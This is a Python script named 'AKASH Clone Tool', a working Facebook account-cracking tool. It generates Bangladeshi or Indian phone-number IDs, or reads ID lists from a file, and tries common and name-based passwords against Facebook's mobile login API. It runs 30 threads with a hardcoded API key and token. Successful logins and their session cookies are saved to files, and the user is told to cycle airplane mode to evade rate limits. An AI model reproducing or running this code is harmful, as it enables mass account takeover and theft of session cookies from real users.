# AKASH Clone Tool - Free Version
# No restrictions, no password, no token required

import os
import sys
import time
import json
import random
import string
import uuid
import base64
from concurrent.futures import ThreadPoolExecutor as AKASH

# Try importing required modules
try:
    import requests
except ImportError:
    print('Installing requests...')
    os.system('pip install requests')
    import requests

# Global variables
loop = 0
oks = []
cps = []
ok = []
cp = []
user = []
methods = []

# Color codes
A = '\033[1;97m'
R = '\033[38;5;196m'
Y = '\033[1;33m'
G = '\033[38;5;48m'
B = '\033[38;5;8m'
G1 = '\033[38;5;46m'
G2 = '\033[38;5;47m'
G3 = '\033[38;5;48m'
G4 = '\033[38;5;49m'
G5 = '\033[38;5;50m'
X = '\033[1;34m'
S = '\033[1;96m'
M = '\033[38;5;205m'

logo = f'''{G1}
 █████  ██   ██  █████  ███████ ██   ██ 
██   ██ ██  ██  ██   ██ ██      ██   ██ 
███████ █████   ███████ ███████ ███████ 
██   ██ ██  ██  ██   ██      ██ ██   ██ 
██   ██ ██   ██ ██   ██ ███████ ██   ██  V4.0 FREE
{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{G1}≋{A}] {G1}OWNER     : {A}AKASH_ON_FIRE
{A}[{G1}≋{A}] {G2}TOOL TYPE : {A}RANDOM_FILE
{A}[{G1}≋{A}] {G3}VERSION   : {A}FREE (NO RESTRICTIONS)
{A}[{G1}≋{A}] {G4}WHATSAPP  : {A}01622094293
{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}
'''

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')

def result(OKs, cps_list):
    if len(OKs) != 0 or len(cps_list) != 0:
        print(f'\r{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')
        print(f'{G1}[{A}={G1}]{G1} PROCESS COMPLETED')
        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}: {G2}{str(len(OKs))}')
        print(f'{G1}[{A}={G3}]{G3} TOTAL CP {A}: {G3}{str(len(cps_list))}')
        print(f'\r{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')
        input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO GO BACK ')

def main_menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
    print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
    print(f'{G1}[{A}3{G3}]{G3} CONTACT OWNER')
    print(f'{G1}[{A}0{G4}]{G4} EXIT')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}: {G5}')
    if select == '1':
        file_menu()
    elif select == '2':
        random_menu()
    elif select == '3':
        os.system('xdg-open https://wa.me/+8801622094293')
        main_menu()
    elif select == '0':
        print(f'{G1}[{A}={G1}]{G1} EXITING...')
        sys.exit()
    else:
        print(f'{G1}[{A}={R}]{R} INVALID OPTION')
        time.sleep(1)
        main_menu()

def random_menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}: {G5}')
    if select == '1':
        bd_clone()
    elif select == '2':
        india_clone()
    elif select == '0':
        main_menu()
    else:
        print(f'{G1}[{A}={R}]{R} INVALID OPTION')
        time.sleep(1)
        random_menu()

def bd_clone():
    global user
    user = []
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}: {G1}017{A}/{G1}019{A}/{G1}018{A}/{G1}016')
    linex()
    code = input(f'{G1}[{A}?{G2}]{G2} SIM CODE {A}: {G2}')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}: {G3}3000{A}/{G3}5000{A}/{G3}10000')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} AMOUNT {A}: {G4}'))
    
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    
    clear()
    print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}: {G1}{code}')
    print(f'{G1}[{A}={G2}]{G2} TOTAL IDS {A}: {G2}{str(len(user))}')
    print(f'{G1}[{A}={G3}]{G3} USE AIRPLANE MODE EVERY 3 MIN')
    linex()
    
    with AKASH(max_workers=30) as executor:
        for love in user:
            ids = code + name + cod + love
            psd = [code + name + cod + love, cod + love, name + love, 'bangladesh', 'Bangladesh', '123456']
            executor.submit(crack_account, ids, psd)
    
    print('')
    result(ok, cp)
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO GO BACK ')
    main_menu()

def india_clone():
    global user
    user = []
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}: {G1}+91639{A}/{G1}+91934{A}/{G1}+91902')
    linex()
    code = input(f'{G1}[{A}?{G2}]{G2} SIM CODE {A}: {G2}')
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}: {G3}3000{A}/{G3}5000{A}/{G3}10000')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} AMOUNT {A}: {G4}'))
    
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    
    clear()
    print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}: {G1}{code}')
    print(f'{G1}[{A}={G2}]{G2} TOTAL IDS {A}: {G2}{str(len(user))}')
    print(f'{G1}[{A}={G3}]{G3} USE AIRPLANE MODE EVERY 3 MIN')
    linex()
    
    with AKASH(max_workers=30) as executor:
        for love in user:
            ids = code + love
            psd = [love, ids[:8], '57273200', '59039200', '123456']
            executor.submit(crack_account, ids, psd)
    
    print('')
    result(ok, cp)
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO GO BACK ')
    main_menu()

def file_menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} METHOD [M1]')
    print(f'{G1}[{A}2{G2}]{G2} METHOD [M2]')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}: {G3}')
    
    if option == '1':
        methods.clear()
        methods.append('methodA')
        file_crack()
    elif option == '2':
        methods.clear()
        methods.append('methodB')
        file_crack()
    elif option == '0':
        main_menu()
    else:
        print(f'{G1}[{A}={R}]{R} INVALID OPTION')
        time.sleep(1)
        file_menu()

def file_crack():
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}: {G1}/sdcard/AKASH.txt')
    linex()
    file_path = input(f'{G1}[{A}?{G2}]{G2} FILE PATH {A}: {G2}')
    
    try:
        file_ids = open(file_path).read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}={R}]{R} FILE NOT FOUND!')
        time.sleep(2)
        file_menu()
        return
    
    clear()
    print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}: {G2}first123/firstlast/Bangladesh')
    linex()
    pw_limit = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT (1-20) {A}: {G3}'))
    
    if pw_limit < 1 or pw_limit > 20:
        print(f'{G1}[{A}={R}]{R} LIMIT MUST BE BETWEEN 1-20')
        time.sleep(2)
        file_crack()
        return
    
    pw = []
    for i in range(pw_limit):
        pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD #{i+1} {A}: {G1}'))
    
    clear()
    print(f'{G1}[{A}={G1}]{G1} TOTAL IDS {A}: {G1}{len(file_ids)}')
    print(f'{G1}[{A}={G2}]{G2} PASSWORDS {A}: {G2}{pw_limit}')
    print(f'{G1}[{A}={G3}]{G3} USE AIRPLANE MODE EVERY 3 MIN')
    linex()
    
    with AKASH(max_workers=30) as executor:
        for line in file_ids:
            try:
                uid, name = line.split('|')
                fs = name.split(' ')[0]
                try:
                    ls = name.split(' ')[1]
                except:
                    ls = fs
                
                pwx = []
                for p in pw:
                    pwx.append(p.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls))
                
                if 'methodA' in methods:
                    executor.submit(method_a, uid, pwx)
                elif 'methodB' in methods:
                    executor.submit(method_b, uid, pwx)
            except:
                pass
    
    result(oks, cps)
    main_menu()

def method_a(uid, passwords):
    global loop
    try:
        for pw in passwords:
            sys.stdout.write(f'\r{G1}[M1]{A} {G1}[{loop}]{A} {G1}[OK:{len(oks)}/CP:{len(cps)}]{A}')
            sys.stdout.flush()
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'WIFI'
            }
            
            response = requests.post('https://b-graph.facebook.com/auth/login', 
                                    data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in response or 'access_token' in response:
                cookies = ';'.join([f"{i['name']}={i['value']}" for i in response.get('session_cookies', [])])
                print(f'\r{G1}[OK] {uid} | {pw}')
                open('/sdcard/AKASH-M1-OK.txt', 'a').write(f'{uid}|{pw}|{cookies}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r{M}[CP] {uid} | {pw}')
                open('/sdcard/AKASH-M1-CP.txt', 'a').write(f'{uid}|{pw}\n')
                cps.append(uid)
                break
        loop += 1
    except:
        pass

def method_b(uid, passwords):
    global loop
    try:
        for pw in passwords:
            sys.stdout.write(f'\r{G2}[M2]{A} {G2}[{loop}]{A} {G2}[OK:{len(oks)}/CP:{len(cps)}]{A}')
            sys.stdout.flush()
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            headers = {
                'User-Agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;]',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE'
            }
            
            response = requests.post('https://b-graph.facebook.com/auth/login', 
                                    data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in response or 'access_token' in response:
                cookies = ';'.join([f"{i['name']}={i['value']}" for i in response.get('session_cookies', [])])
                print(f'\r{G2}[OK] {uid} | {pw}')
                open('/sdcard/AKASH-M2-OK.txt', 'a').write(f'{uid}|{pw}|{cookies}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r{M}[CP] {uid} | {pw}')
                open('/sdcard/AKASH-M2-CP.txt', 'a').write(f'{uid}|{pw}\n')
                cps.append(uid)
                break
        loop += 1
    except:
        pass

def crack_account(uid, passwords):
    global loop
    try:
        for pw in passwords:
            sys.stdout.write(f'\r{G1}[RANDOM]{A} {G1}[{loop}]{A} {G1}[OK:{len(ok)}/CP:{len(cp)}]{A}')
            sys.stdout.flush()
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'WIFI'
            }
            
            response = requests.post('https://b-graph.facebook.com/auth/login', 
                                    data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in response or 'access_token' in response:
                cookies = ';'.join([f"{i['name']}={i['value']}" for i in response.get('session_cookies', [])])
                print(f'\r{G1}[OK] {uid} | {pw}')
                print(f'{G1}[COOKIE] {cookies}')
                open('/sdcard/AKASH-OK.txt', 'a').write(f'{uid}|{pw}|{cookies}\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r{M}[CP] {uid} | {pw}')
                open('/sdcard/AKASH-CP.txt', 'a').write(f'{uid}|{pw}\n')
                cp.append(uid)
                break
        loop += 1
    except:
        pass

# Main execution
if __name__ == '__main__':
    try:
        os.system('clear')
        print(logo)
        print(f'{G1}[{A}!{G1}]{G1} TOOL IS NOW FREE - NO RESTRICTIONS!')
        print(f'{G1}[{A}!{G1}]{G1} ALL FEATURES UNLOCKED')
        linex()
        time.sleep(2)
        main_menu()
    except KeyboardInterrupt:
        print(f'\n{R}[!] EXITING...{A}')
        sys.exit()
    except Exception as e:
        print(f'\n{R}[ERROR] {str(e)}{A}')
        sys.exit()
